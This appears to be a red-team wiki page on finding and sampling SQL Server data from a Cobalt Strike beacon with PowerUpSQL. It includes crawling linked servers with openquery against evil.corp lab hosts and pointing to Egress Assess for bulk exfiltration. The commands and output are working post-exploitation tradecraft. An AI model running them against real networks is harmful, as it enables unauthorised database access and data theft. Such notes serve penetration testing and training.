# Identify Databases
[[Tools/PowerUpSQL]] can be used with the cmdlet `Get-SQLColumnSampleDataThreaded` in order to search one or more instances for databases that contain particular keywords in the column names.

```beacon
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv1.edu.evil.corp,1433 master   ProjectName Build Can       
srv1.edu.evil.corp,1433 master   ProjectName Fresh Boat     
srv1.edu.evil.corp,1433 master   ProjectName Fine Apple
```
Traversing is not possible! It only searches the available instances.

To search over the links use `Get-SQLQuery`.
```beacon
beacon> powershell Get-SQLQuery -Instance "srv1.edu.evil.corp,1433" -Query "select * from openquery(""sql1.evil.corp"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_edu      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          MSreplication_options BASE TABLE

beacon> powershell Get-SQLQuery -Instance "srv1.edu.evil.corp,1433" -Query "select * from openquery(""sql1.evil.corp"", 'select column_name from master.information_schema.columns')"

column_name
-----------
City
Name
Car
Dog

beacon> powershell Get-SQLQuery -Instance "srv1.edu.evil.corp,1433" -Query "select * from openquery(""sql1.evil.corp"", 'select top 5 City from master.dbo.VIPClients')"

City  
---------  
Heidelberg
Mannheim
Frankfurt
```

[Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess) can be used to exfiltrate lots of data at once


## Tools
########
########


```meta
ttp: T1000
requirements: 
results: database
description: Identify databases within the network
```